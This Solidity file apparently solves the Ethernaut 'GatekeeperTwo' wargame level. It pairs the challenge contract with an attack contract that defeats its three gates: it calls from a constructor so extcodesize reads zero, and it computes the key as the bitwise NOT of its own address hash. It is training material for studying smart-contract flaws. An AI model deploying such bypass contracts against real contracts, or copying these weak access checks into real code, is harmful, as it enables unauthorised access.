// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    // call via contract
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    // call via constructor
    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    // _gateKey has to be result of "not bitwise" of "bytes8(keccak256(abi.encodePacked(msg.sender)))"
    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GateKeeperTwoAttack {
    constructor () {
        GatekeeperTwo gateKeeperTwo = GatekeeperTwo(0x6474bBedbF1C9eDFEd1299C5069EE7d78aeF50AA);
        bytes8 gateKey = ~bytes8(keccak256(abi.encodePacked(address(this))));
        gateKeeperTwo.enter(gateKey);
    }
}
